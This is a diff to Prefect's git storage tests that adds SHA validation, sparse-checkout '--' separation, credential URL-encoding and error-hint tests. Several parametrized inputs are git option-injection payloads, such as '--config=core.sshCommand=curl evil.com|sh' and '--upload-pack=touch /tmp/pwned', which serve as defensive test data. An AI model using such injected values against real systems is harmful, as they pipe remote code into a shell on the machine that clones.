@@ -1,5 +1,6 @@
 import re
 import shutil
+import subprocess
 from pathlib import Path
 from textwrap import dedent
 from typing import Optional
@@ -19,6 +20,8 @@ from prefect.runner.storage import (
     LocalStorage,
     RemoteStorage,
     RunnerStorage,
+    _get_git_clone_error_hint,
+    _get_remote_storage_error_hint,
     create_storage_from_source,
 )
 from prefect.utilities.filesystem import tmpchdir
@@ -195,6 +198,68 @@ class TestGitRepository:
                 credentials={"username": "oauth2"},
             )
 
+    @pytest.mark.parametrize(
+        "invalid_sha",
+        [
+            "--upload-pack=touch /tmp/pwned",
+            "--config=core.sshCommand=curl evil.com|sh",
+            "-c core.sshCommand=evil",
+            "not-a-hex-string",
+            "ghijkl",
+            "abc",  # too short (< 4 chars)
+            "a" * 65,  # too long (exceeds SHA-256 length)
+        ],
+    )
+    def test_init_rejects_invalid_commit_sha(self, invalid_sha: str):
+        with pytest.raises(ValueError, match="use the 'branch' parameter instead"):
+            GitRepository(
+                url="https://github.com/org/repo.git",
+                commit_sha=invalid_sha,
+            )
+
+    @pytest.mark.parametrize(
+        "valid_sha",
+        [
+            "abcd",  # 4-char short SHA
+            "1234567",
+            "1234567890",
+            "abcdef1234567890abcdef1234567890abcdef12",  # SHA-1 (40 chars)
+            "ABCDEF1234567890ABCDEF1234567890ABCDEF12",
+            "aAbBcCdD1234567890",
+            "a" * 64,  # SHA-256 (64 chars)
+        ],
+    )
+    def test_init_accepts_valid_commit_sha(self, valid_sha: str):
+        repo = GitRepository(
+            url="https://github.com/org/repo.git",
+            commit_sha=valid_sha,
+        )
+        assert repo._commit_sha == valid_sha
+
+    @pytest.mark.parametrize(
+        "suspicious_dir",
+        [
+            "--config=core.sshCommand=curl http://evil.com|sh",
+            "--upload-pack=evil",
+        ],
+    )
+    def test_init_warns_on_directories_starting_with_double_dash(
+        self, suspicious_dir: str
+    ):
+        with pytest.warns(UserWarning, match="starts with '--'"):
+            repo = GitRepository(
+                url="https://github.com/org/repo.git",
+                directories=[suspicious_dir],
+            )
+        assert repo._directories == [suspicious_dir]
+
+    def test_init_accepts_valid_directories(self):
+        repo = GitRepository(
+            url="https://github.com/org/repo.git",
+            directories=["src", "tests", "-flag-like-dir", "path/to/dir"],
+        )
+        assert repo._directories == ["src", "tests", "-flag-like-dir", "path/to/dir"]
+
     def test_init_with_name(self):
         repo = GitRepository(url="https://github.com/org/repo.git", name="custom-name")
         assert repo._name == "custom-name"
@@ -234,6 +299,37 @@ class TestGitRepository:
             ),
         ):
             await repo.pull_code()
+
+    async def test_pull_code_existing_repo_with_embedded_credentials(self, monkeypatch):
+        """
+        Regression test for https://github.com/PrefectHQ/prefect/pull/20330
+
+        When a URL with embedded credentials is passed directly (without a
+        separate credentials object), pulling from an existing repo should
+        still work. The git config stores the URL with credentials, which
+        must be compared correctly to the configured URL.
+        """
+
+        # Git config returns URL with credentials (as stored during clone)
+        async def mock_run_process(*args, **kwargs):
+            class Result:
+                stdout = (
+                    "https://x-access-token:ghp_secret@github.com/org/repo.git".encode()
+                )
+
+            return Result()
+
+        monkeypatch.setattr("prefect.runner.storage.run_process", mock_run_process)
+        monkeypatch.setattr("pathlib.Path.exists", lambda x: ".git" in str(x))
+
+        # URL passed with embedded credentials (no separate credentials object)
+        repo = GitRepository(
+            url="https://x-access-token:ghp_secret@github.com/org/repo.git"
+        )
+
+        # Should NOT raise - the URLs match (same repo, same credentials)
+        # Before fix: raises ValueError because stripped URL != URL with creds
+        await repo.pull_code()
 
     async def test_pull_code_clone_repo(self, mock_run_process: AsyncMock, monkeypatch):
         monkeypatch.setattr("pathlib.Path.exists", lambda x: False)
@@ -281,7 +377,7 @@ class TestGitRepository:
                 ]
             ),
             call(
-                ["git", "sparse-checkout", "set", "dir_1", "dir_2"],
+                ["git", "sparse-checkout", "set", "--", "dir_1", "dir_2"],
                 cwd=Path.cwd() / "repo",
             ),
         ]
@@ -315,7 +411,7 @@ class TestGitRepository:
                 cwd=Path.cwd() / "repo",
             ),
             call(
-                ["git", "sparse-checkout", "set", "dir_1", "dir_2"],
+                ["git", "sparse-checkout", "set", "--", "dir_1", "dir_2"],
                 cwd=Path.cwd() / "repo",
             ),
             call(["git", "pull", "origin", "--depth", "1"], cwd=Path.cwd() / "repo"),
@@ -825,6 +921,89 @@ class TestGitRepository:
                 ],
             )
 
+        async def test_dict_credentials_url_encodes_special_chars_in_username_and_password(
+            self, mock_run_process: AsyncMock
+        ):
+            """
+            Test that dict credentials with special characters in username and
+            password are properly URL-encoded when constructing the git clone URL.
+
+            Regression test for https://github.com/PrefectHQ/prefect/issues/21537
+            """
+            repo = GitRepository(
+                url="https://bitbucket.test.com/scm/test/test.git",
+                credentials={
+                    "username": "user@domain.com",
+                    "password": "p@ss!word#123",
+                },
+            )
+
+            await repo.pull_code()
+
+            mock_run_process.assert_awaited_once_with(
+                [
+                    "git",
+                    "clone",
+                    "https://user%40domain.com:p%40ss%21word%23123@bitbucket.test.com/scm/test/test.git",
+                    "--depth",
+                    "1",
+                    str(Path.cwd() / "test"),
+                ],
+            )
+
+        async def test_dict_credentials_url_encodes_bitbucket_server_token(
+            self, mock_run_process: AsyncMock
+        ):
+            """
+            Test that BitBucket Server credentials in username:token format
+            are properly URL-encoded.
+
+            Regression test for https://github.com/PrefectHQ/prefect/issues/21537
+            """
+            repo = GitRepository(
+                url="https://bitbucketserver.example.com/scm/project/repo.git",
+                credentials={"token": "user@corp.com:token!with#special"},
+            )
+
+            await repo.pull_code()
+
+            mock_run_process.assert_awaited_once_with(
+                [
+                    "git",
+                    "clone",
+                    "https://user%40corp.com:token%21with%23special@bitbucketserver.example.com/scm/project/repo.git",
+                    "--depth",
+                    "1",
+                    str(Path.cwd() / "repo"),
+                ],
+            )
+
+        async def test_dict_credentials_url_encodes_github_token(
+            self, mock_run_process: AsyncMock
+        ):
+            """
+            Test that GitHub tokens with special characters are URL-encoded.
+
+            Regression test for https://github.com/PrefectHQ/prefect/issues/21537
+            """
+            repo = GitRepository(
+                url="https://github.com/org/repo.git",
+                credentials={"token": "ghp_token/with+special=chars"},
+            )
+
+            await repo.pull_code()
+
+            mock_run_process.assert_awaited_once_with(
+                [
+                    "git",
+                    "clone",
+                    "https://ghp_token%2Fwith%2Bspecial%3Dchars@github.com/org/repo.git",
+                    "--depth",
+                    "1",
+                    str(Path.cwd() / "repo"),
+                ],
+            )
+
     class TestToPullStep:
         async def test_to_pull_step_with_block_credentials(self):
             credentials = MockCredentials(username="testuser", access_token="testtoken")
@@ -1072,6 +1251,135 @@ class TestGitRepository:
 
         mock_run_process.assert_has_awaits(expected_calls)
         assert mock_run_process.await_args_list == expected_calls
+
+
+class TestGitCloneErrorHints:
+    """Tests for _get_git_clone_error_hint pattern matching."""
+
+    @pytest.mark.parametrize(
+        "stderr_text,expected_hint_fragment",
+        [
+            (
+                b"fatal: Authentication failed for 'https://github.com/org/repo.git'",
+                "credentials or access token",
+            ),
+            (
+                b"fatal: repository 'https://github.com/org/repo.git' not found",
+                "Verify the repository URL",
+            ),
+            (
+                b"ERROR: Repository not found.",
+                "Verify the repository URL",
+            ),
+            (
+                b"fatal: Could not resolve host: github.com",
+                "network connectivity",
+            ),
+            (
+                b"fatal: unable to access: Connection refused",
+                "network connectivity",
+            ),
+            (
+                b"Permission denied (publickey).",
+                "SSH key or token permissions",
+            ),
+            (
+                b"fatal: destination path 'repo' already exists and is not an empty directory.",
+                "stale working directory",
+            ),
+            (
+                b"fatal: destination path '/some/path' already exists",
+                "stale working directory",
+            ),
+        ],
+    )
+    def test_git_clone_error_hint_patterns(self, stderr_text, expected_hint_fragment):
+        exc = subprocess.CalledProcessError(128, ["git", "clone"], stderr=stderr_text)
+        hint = _get_git_clone_error_hint(exc)
+        assert hint is not None
+        assert expected_hint_fragment in hint
+
+    def test_git_clone_error_hint_no_match(self):
+        exc = subprocess.CalledProcessError(
+            128, ["git", "clone"], stderr=b"some unknown error"
+        )
+        hint = _get_git_clone_error_hint(exc)
+        assert hint is None
+
+    def test_git_clone_error_hint_no_stderr(self):
+        exc = subprocess.CalledProcessError(128, ["git", "clone"], stderr=None)
+        hint = _get_git_clone_error_hint(exc)
+        assert hint is None
+
+    def test_git_clone_error_hint_string_stderr(self):
+        exc = subprocess.CalledProcessError(
+            128, ["git", "clone"], stderr="Authentication failed"
+        )
+        hint = _get_git_clone_error_hint(exc)
+        assert hint is not None
+        assert "credentials" in hint
+
+    async def test_clone_repo_includes_hint_in_error(self, monkeypatch):
+        """Integration test: _clone_repo includes the hint in the RuntimeError."""
+        monkeypatch.setattr("pathlib.Path.exists", lambda x: False)
+
+        async def mock_run_process_auth_fail(*args, **kwargs):
+            raise subprocess.CalledProcessError(
+                128,
+                ["git", "clone"],
+                stderr=b"fatal: Authentication failed for 'https://github.com/org/repo.git'",
+            )
+
+        monkeypatch.setattr(
+            "prefect.runner.storage.run_process", mock_run_process_auth_fail
+        )
+
+        repo = GitRepository(url="https://github.com/org/repo.git")
+        with pytest.raises(RuntimeError, match="credentials or access token"):
+            await repo.pull_code()
+
+
+class TestRemoteStorageErrorHints:
+    """Tests for _get_remote_storage_error_hint pattern matching."""
+
+    @pytest.mark.parametrize(
+        "error_message,expected_hint_fragment",
+        [
+            ("NoSuchBucket: the bucket does not exist", "bucket name and region"),
+            ("AccessDenied: you do not have permission", "permissions and credentials"),
+            ("403 Forbidden", "permissions and credentials"),
+            ("NoSuchKey: the object does not exist", "storage path exists"),
+            ("ConnectionError: failed to connect", "network connectivity"),
+            ("EndpointConnectionError: cannot reach endpoint", "network connectivity"),
+            ("ConnectionRefusedError: connection refused", "network connectivity"),
+        ],
+    )
+    def test_remote_storage_error_hint_patterns(
+        self, error_message, expected_hint_fragment
+    ):
+        exc = Exception(error_message)
+        hint = _get_remote_storage_error_hint(exc)
+        assert hint is not None
+        assert expected_hint_fragment in hint
+
+    def test_remote_storage_error_hint_no_match(self):
+        exc = Exception("some unknown error")
+        hint = _get_remote_storage_error_hint(exc)
+        assert hint is None
+
+    async def test_pull_code_includes_hint_in_error(self, monkeypatch):
+        """Integration test: RemoteStorage.pull_code includes the hint in the RuntimeError."""
+        rs = RemoteStorage("memory://path/to/directory/")
+
+        mock_mkdir = MagicMock()
+        monkeypatch.setattr("pathlib.Path.mkdir", mock_mkdir)
+
+        mock_get = MagicMock()
+        mock_get.side_effect = Exception("NoSuchBucket: the bucket does not exist")
+        monkeypatch.setattr(rs._filesystem, "get", mock_get)
+
+        with pytest.raises(RuntimeError, match="bucket name and region"):
+            await rs.pull_code()
 
 
 class TestRemoteStorage:
